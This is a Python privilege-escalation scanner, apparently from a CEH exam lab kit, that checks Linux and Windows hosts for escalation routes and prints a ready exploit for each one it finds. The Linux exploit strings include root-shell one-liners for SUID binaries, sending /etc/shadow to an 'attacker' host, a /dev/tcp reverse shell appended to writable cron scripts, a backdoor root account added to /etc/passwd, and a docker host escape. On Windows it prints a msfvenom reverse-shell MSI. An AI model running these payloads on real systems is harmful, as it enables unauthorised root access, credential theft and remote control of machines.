#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ELITE PRIVILEGE ESCALATION SCANNER v1.0 — CEH v13 Lab Arsenal            ║
║  Automated privesc vector enumeration for Linux & Windows                  ║
║  LAB-ONLY — AUTHORIZED TESTING ONLY                                       ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""
import sys, os, platform, subprocess, re, json, stat, glob
from datetime import datetime

class PrivescScanner:
    def __init__(self):
        self.system = platform.system()
        self.findings = []
        self.colors = {"R":"\033[91m","G":"\033[92m","Y":"\033[93m","B":"\033[94m",
                       "M":"\033[95m","C":"\033[96m","0":"\033[0m"}

    def c(self, color, text):
        return f"{self.colors.get(color,'')}{text}{self.colors['0']}"

    def finding(self, severity, title, detail, exploit=""):
        self.findings.append({"severity": severity, "title": title, "detail": detail, "exploit": exploit})
        icon = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🟢","INFO":"🔵"}
        print(f"  {icon.get(severity,'⚪')} {self.c('R' if severity in ['CRITICAL','HIGH'] else 'Y', f'[{severity}]')} {title}")
        if detail: print(f"      {detail}")
        if exploit: print(f"      {self.c('M','⚡')} {exploit}")

    def _run(self, cmd, timeout=10):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip()
        except Exception:
            return ""

    # ═══════════════════════════════════════════════════════════════════════════
    # LINUX CHECKS
    # ═══════════════════════════════════════════════════════════════════════════

    def linux_suid(self):
        print(f"\n{self.c('C','[1/12]')} SUID/SGID Binaries")
        dangerous = {
            "python": "python -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "python3": "python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            "perl": "perl -e 'exec \"/bin/bash\"'",
            "ruby": "ruby -e 'exec \"/bin/bash\"'",
            "find": "find / -exec /bin/bash -p \\; -quit",
            "vim": "vim -c ':!bash'", "vi": "vi -c ':!bash'",
            "nmap": "nmap --interactive -> !sh",
            "bash": "bash -p", "dash": "dash -p",
            "env": "env /bin/bash -p",
            "awk": "awk 'BEGIN{system(\"/bin/bash -p\")}'",
            "less": "less /etc/shadow -> !bash",
            "more": "more /etc/shadow -> !bash",
            "man": "man man -> !bash",
            "cp": "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash",
            "wget": "wget --post-file=/etc/shadow attacker:8080",
            "curl": "curl file:///etc/shadow",
            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
            "zip": "zip /tmp/x.zip /tmp -T --unzip-command='sh -c /bin/bash'",
            "pkexec": "CVE-2021-4034 (PwnKit)",
            "sudo": "sudo -l (check allowed commands)",
            "doas": "doas /bin/bash",
            "systemctl": "systemctl enable --now malicious.service",
            "journalctl": "journalctl -> !bash",
            "mount": "mount -o bind /bin/bash /bin/mount",
            "strace": "strace -o /dev/null /bin/bash -p",
            "ltrace": "ltrace -o /dev/null /bin/bash -p",
            "gdb": "gdb -q -nx -ex 'python import os;os.setuid(0)' -ex 'python import os;os.system(\"/bin/bash\")' -ex quit",
            "docker": "docker run -v /:/host --privileged -it alpine chroot /host",
            "lxc": "lxc exec container -- /bin/bash",
        }
        output = self._run("find / -perm -4000 -o -perm -2000 2>/dev/null | head -80", timeout=30)
        if output:
            for line in output.split("\n"):
                binary = os.path.basename(line.strip())
                if binary in dangerous:
                    self.finding("CRITICAL", f"Exploitable SUID: {line.strip()}",
                                f"GTFOBins privesc available", dangerous[binary])
                elif line.strip():
                    self.finding("INFO", f"SUID binary: {line.strip()}", "Review manually")

    def linux_sudo(self):
        print(f"\n{self.c('C','[2/12]')} Sudo Configuration")
        output = self._run("sudo -l 2>/dev/null")
        if output:
            dangerous_sudo = ["ALL", "NOPASSWD", "env_keep", "LD_PRELOAD", "LD_LIBRARY_PATH",
                              "/bin/bash", "/bin/sh", "python", "perl", "ruby", "vi", "vim",
                              "nmap", "find", "awk", "less", "more", "man", "ftp", "zip",
                              "tar", "docker", "lxc", "mount", "strace", "gdb", "tcpdump"]
            for line in output.split("\n"):
                for d in dangerous_sudo:
                    if d.lower() in line.lower():
                        self.finding("CRITICAL", f"Sudo misconfiguration: {line.strip()[:80]}",
                                    f"Dangerous pattern: {d}")
                        break
        # Check /etc/sudoers readable
        if os.access("/etc/sudoers", os.R_OK):
            self.finding("HIGH", "/etc/sudoers is world-readable", "May contain NOPASSWD rules")

    def linux_writable_files(self):
        print(f"\n{self.c('C','[3/12]')} Writable Critical Files")
        critical = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/crontab",
                    "/root/.ssh/authorized_keys", "/etc/ssh/sshd_config",
                    "/etc/ld.so.conf", "/etc/profile", "/etc/environment"]
        for f in critical:
            if os.path.exists(f) and os.access(f, os.W_OK):
                self.finding("CRITICAL", f"Writable: {f}",
                            "Direct privilege escalation possible",
                            f"echo 'hacker:$(openssl passwd -1 pass):0:0::/root:/bin/bash' >> {f}" if f == "/etc/passwd" else "")

    def linux_cron(self):
        print(f"\n{self.c('C','[4/12]')} Cron Jobs & Timers")
        cron_dirs = ["/etc/crontab", "/etc/cron.d", "/var/spool/cron", "/var/spool/cron/crontabs"]
        for d in cron_dirs:
            if os.path.exists(d):
                if os.path.isfile(d):
                    try:
                        with open(d, "r") as f:
                            for line in f:
                                if line.strip() and not line.startswith("#"):
                                    # Check if script is writable
                                    parts = line.split()
                                    for part in parts:
                                        if part.startswith("/") and os.path.exists(part) and os.access(part, os.W_OK):
                                            self.finding("CRITICAL", f"Writable cron script: {part}",
                                                        f"In {d}", f"echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> {part}")
                    except PermissionError:
                        pass

        # Systemd timers
        output = self._run("systemctl list-timers --all 2>/dev/null | head -20")
        if output and "NEXT" in output:
            self.finding("INFO", "Active systemd timers found", output[:200])

    def linux_capabilities(self):
        print(f"\n{self.c('C','[5/12]')} Linux Capabilities")
        output = self._run("getcap -r / 2>/dev/null | head -30", timeout=20)
        if output:
            dangerous_caps = ["cap_setuid", "cap_setgid", "cap_dac_override", "cap_sys_admin",
                              "cap_sys_ptrace", "cap_net_raw", "cap_net_admin", "cap_fowner"]
            for line in output.split("\n"):
                for cap in dangerous_caps:
                    if cap in line.lower():
                        self.finding("HIGH", f"Dangerous capability: {line.strip()[:80]}",
                                    f"Capability {cap} can be exploited for privesc")

    def linux_kernel(self):
        print(f"\n{self.c('C','[6/12]')} Kernel & OS Version")
        kernel = self._run("uname -r")
        distro = self._run("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2")
        if kernel:
            self.finding("INFO", f"Kernel: {kernel}", distro.strip('"'))
            # Known vulnerable kernels
            known_vuln = {
                "3.": "DirtyCow (CVE-2016-5195), DirtyPipe may apply",
                "4.": "Check for DirtyPipe (CVE-2022-0847) if 4.x < 5.8",
                "5.8": "DirtyPipe (CVE-2022-0847) — 5.8 to 5.16.11",
            }
            for pattern, cve in known_vuln.items():
                if kernel.startswith(pattern):
                    self.finding("HIGH", f"Potentially vulnerable kernel: {kernel}", cve)

    def linux_network(self):
        print(f"\n{self.c('C','[7/12]')} Network & Internal Services")
        output = self._run("ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null")
        if output:
            for line in output.split("\n"):
                if "127.0.0.1" in line or "::1" in line:
                    self.finding("LOW", f"Internal service: {line.strip()[:80]}", "May be exploitable locally")

    def linux_docker(self):
        print(f"\n{self.c('C','[8/12]')} Container & Virtualization")
        if os.path.exists("/.dockerenv"):
            self.finding("INFO", "Running inside Docker container", "Check for escape vectors")
            if os.path.exists("/var/run/docker.sock"):
                self.finding("CRITICAL", "Docker socket mounted!", "Full host escape possible",
                            "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host")
        groups = self._run("id")
        if groups and "docker" in groups:
            self.finding("CRITICAL", "User in docker group", "Can escalate to root",
                        "docker run -v /:/host -it alpine chroot /host")
        if groups and "lxd" in groups:
            self.finding("CRITICAL", "User in lxd group", "Can escalate to root via container")

    def linux_passwords(self):
        print(f"\n{self.c('C','[9/12]')} Credential & Secret Files")
        secret_patterns = [
            "/home/*/.bash_history", "/root/.bash_history",
            "/home/*/.ssh/id_*", "/root/.ssh/id_*",
            "/var/www/html/*.conf", "/var/www/html/wp-config.php",
            "/etc/mysql/debian.cnf", "/opt/*/config*",
            "/home/*/.vnc/passwd", "/home/*/.pgpass",
        ]
        for pattern in secret_patterns:
            for f in glob.glob(pattern):
                if os.access(f, os.R_OK):
                    self.finding("MEDIUM", f"Readable secret: {f}", "May contain credentials")

    # ═══════════════════════════════════════════════════════════════════════════
    # WINDOWS CHECKS
    # ═══════════════════════════════════════════════════════════════════════════

    def windows_services(self):
        print(f"\n{self.c('C','[1/9]')} Unquoted Service Paths")
        output = self._run('wmic service get name,displayname,pathname,startmode 2>nul | findstr /i "auto" | findstr /i /v "C:\\Windows"', timeout=15)
        if output:
            for line in output.split("\n"):
                if '"' not in line and " " in line:
                    self.finding("HIGH", f"Unquoted service path: {line.strip()[:80]}",
                                "DLL hijacking or path interception possible")

    def windows_always_install(self):
        print(f"\n{self.c('C','[2/9]')} AlwaysInstallElevated")
        output = self._run('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul')
        if output and "0x1" in output:
            self.finding("CRITICAL", "AlwaysInstallElevated is ENABLED",
                        "Any user can install MSI as SYSTEM",
                        "msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi > shell.msi && msiexec /i shell.msi")

    def windows_autologon(self):
        print(f"\n{self.c('C','[3/9]')} AutoLogon Credentials")
        output = self._run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul')
        if output:
            for field in ["DefaultPassword", "DefaultUserName", "DefaultDomainName"]:
                if field in output:
                    self.finding("CRITICAL", f"AutoLogon {field} found in registry",
                                "Plaintext credentials stored")

    def windows_stored_creds(self):
        print(f"\n{self.c('C','[4/9]')} Stored Credentials")
        output = self._run("cmdkey /list 2>nul")
        if output and "Target:" in output:
            self.finding("HIGH", "Stored credentials found", output[:200],
                        "runas /savecred /user:DOMAIN\\USER cmd.exe")

    def windows_scheduled_tasks(self):
        print(f"\n{self.c('C','[5/9]')} Writable Scheduled Task Binaries")
        output = self._run('schtasks /query /fo csv /v 2>nul | findstr /i /v "Microsoft"', timeout=15)
        if output:
            for line in output.split("\n"):
                parts = line.split(",")
                if len(parts) > 8:
                    binary = parts[8].strip('"')
                    if binary and os.path.exists(binary) and os.access(binary, os.W_OK):
                        self.finding("CRITICAL", f"Writable scheduled task binary: {binary}",
                                    f"Task: {parts[0]}", "Replace binary with reverse shell")

    def windows_patches(self):
        print(f"\n{self.c('C','[6/9]')} Missing Patches")
        output = self._run("wmic qfe list brief 2>nul", timeout=15)
        if output:
            patches = len([l for l in output.split("\n") if "KB" in l])
            self.finding("INFO", f"{patches} patches installed", "Cross-reference with exploit-db for missing patches")

    def windows_privs(self):
        print(f"\n{self.c('C','[7/9]')} Token Privileges")
        output = self._run("whoami /priv 2>nul")
        dangerous_privs = {
            "SeImpersonatePrivilege": "Potato attacks (JuicyPotato, PrintSpoofer, GodPotato)",
            "SeAssignPrimaryTokenPrivilege": "Token impersonation attacks",
            "SeBackupPrivilege": "Read any file including SAM/SYSTEM",
            "SeRestorePrivilege": "Write any file, DLL hijacking",
            "SeDebugPrivilege": "Inject into SYSTEM processes",
            "SeTakeOwnershipPrivilege": "Take ownership of any object",
            "SeLoadDriverPrivilege": "Load malicious kernel driver",
        }
        if output:
            for priv, desc in dangerous_privs.items():
                if priv in output and "Enabled" in output.split(priv)[1].split("\n")[0]:
                    self.finding("CRITICAL", f"Dangerous privilege: {priv}",
                                desc, f"Use {desc.split('(')[1].rstrip(')') if '(' in desc else 'appropriate tool'}")

    def windows_network(self):
        print(f"\n{self.c('C','[8/9]')} Internal Network Services")
        output = self._run("netstat -ano 2>nul | findstr LISTENING")
        if output:
            for line in output.split("\n"):
                if "127.0.0.1" in line or "0.0.0.0" in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        self.finding("LOW", f"Listening: {parts[1]}", f"PID: {parts[-1]}")

    def windows_passwords(self):
        print(f"\n{self.c('C','[9/9]')} Password Files & SAM")
        paths = [
            r"C:\Windows\System32\config\SAM",
            r"C:\Windows\repair\SAM",
            r"C:\Windows\System32\config\SYSTEM",
            r"C:\Users\*\Desktop\*.txt",
            r"C:\Users\*\Documents\*.txt",
            r"C:\inetpub\wwwroot\web.config",
        ]
        for pattern in paths:
            for f in glob.glob(pattern):
                if os.access(f, os.R_OK):
                    self.finding("HIGH", f"Readable: {f}", "May contain credentials or hashes")

    # ═══════════════════════════════════════════════════════════════════════════
    # MAIN
    # ═══════════════════════════════════════════════════════════════════════════
    def run(self):
        print(f"""
{'='*70}
  ⚡ ELITE PRIVILEGE ESCALATION SCANNER v1.0
  System:  {platform.platform()}
  User:    {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}
  UID:     {os.getuid() if hasattr(os, 'getuid') else 'N/A'}
{'='*70}""")

        if self.system == "Linux":
            self.linux_suid()
            self.linux_sudo()
            self.linux_writable_files()
            self.linux_cron()
            self.linux_capabilities()
            self.linux_kernel()
            self.linux_network()
            self.linux_docker()
            self.linux_passwords()
        elif self.system == "Windows":
            self.windows_services()
            self.windows_always_install()
            self.windows_autologon()
            self.windows_stored_creds()
            self.windows_scheduled_tasks()
            self.windows_patches()
            self.windows_privs()
            self.windows_network()
            self.windows_passwords()

        # Summary
        print(f"\n{'='*70}")
        print(f"  📊 PRIVESC SCAN COMPLETE")
        print(f"{'='*70}")
        sevs = {}
        for f in self.findings:
            sevs[f["severity"]] = sevs.get(f["severity"], 0) + 1
        for s in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"]:
            if s in sevs:
                print(f"  {s:10s}: {sevs[s]}")
        print(f"  Total:     {len(self.findings)}")

        criticals = [f for f in self.findings if f["severity"] == "CRITICAL"]
        if criticals:
            print(f"\n  {self.c('R',f'🔴 {len(criticals)} CRITICAL privesc vectors:')}")
            for f in criticals:
                print(f"    → {f['title']}")

        report = f"privesc-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report, "w") as f:
            json.dump({"system": platform.platform(), "findings": self.findings}, f, indent=2)
        print(f"\n  📄 Report: {report}")

if __name__ == "__main__":
    scanner = PrivescScanner()
    scanner.run()
